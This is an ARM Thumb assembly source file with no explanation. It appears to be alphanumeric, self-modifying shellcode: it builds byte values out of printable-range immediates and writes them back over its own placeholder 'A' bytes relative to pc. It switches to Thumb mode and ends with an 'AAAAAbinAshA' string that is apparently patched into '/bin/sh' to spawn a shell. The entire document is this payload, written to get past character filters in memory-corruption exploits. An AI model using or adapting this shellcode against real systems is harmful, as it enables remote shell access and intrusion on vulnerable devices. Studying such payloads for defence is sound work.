
.text
.global _start
        
_start:

.THUMB
	mul r1 , r2
	mul r1 , r2
	mul r0 , r2
	mov r0 , pc
	mul r5, r2
	add r1, #0x43
	sub r1, #0x41
        add r5, #0x4d
	add r5, #0x41  
	strb r1 ,[ r0 , r5 ]
	mul r5 , r2
	mul r1 , r2
	add r5, #0x4d
	add r5, #0x42
	strb r1 ,[ r0 , r5 ]
	mul r5, r2
	mul r1, r2
	add r1, #0x61
	add r1, #0x70
	sub r1, #0x32
	add r5, #0x4d
	add r5, #0x43
	strb r1 ,[ r0 , r5 ]
	mul r5, r2
	add r1, #0x50
	add r5, #0x4d
	add r5, #0x44
	strb r1 ,[ r0 , r5 ]
	mul r5, r2
	mul r1, r2
	add r1, #0x61
	sub r1, #0x4b
	add r5, #0x4d
	add r5, #0x45
	strb r1 ,[ r0 , r5 ]
	mul r5, r2
	mul r1, r2
	add r1, #0x7a
	add r1, #0x41
	add r1, #0x44
	add r5, #0x4d
	add r5, #0x46
	strb r1 ,[ r0 , r5 ]
	mul r5, r2
	mul r1, r2
	add r1, #0x7a
	sub r1, #0x4b
	add r5, #0x4d
	add r5, #0x47
	strb r1 ,[ r0 , r5 ]
	mul r5, r2
	add r1, #0x70
	add r1, #0x42
	add r5, #0x4d
	add r5, #0x48
	strb r1 ,[ r0 , r5 ]
	mul r5, r2 
	add r1, #0x41
	sub r1, #0x43
	add r5, #0x39
	add r5, #0x41
	add r5, #0x4d
	strb r1 ,[ r0 , r5 ]
	mul r1 , r2
	add r1, #0x41
	sub r1, #0x42
	neg r6 , r1
	mul r6 , r0
	add r6 , #0x4d
	add r6 , #0x4a
	mul r0,r2 
	mul r1,r2          
	add r1 , #0x41       
	sub r1 , #0x42
	bx pc 
	add r7,#0x41
.byte 0x41
.byte 0x41
.byte 0x41
.byte 0x41
.byte 0x41
.byte 0x41
.byte 0x41
.byte 0x41

	mul r2 , r0
	mov r0 , pc
	mul r5 , r2
	mul r1 , r2

	add r1 , #100
	sub r1 , #53
	add r5 , #48           
	strb r1 ,[ r0 , r5 ]

	mul r5 , r2
	add r5 , #52
	strb r1 , [ r0 , r5]

	mul r5 , r2
	add r5 , #55
	strb r2 , [ r0 , r5]

	mul r1,r2
	add r1 , #0x50
	sub r1 , #0x51
	neg r7 , r1
	mul r1,r2
	add r1, #0x4c
	sub r1 , #0x41 
	mul r7 , r1 
	add r0,#48
	mul r1 , r2

.byte 0x41
.byte 0x41
        
.ascii "AAAAAbinAshA"
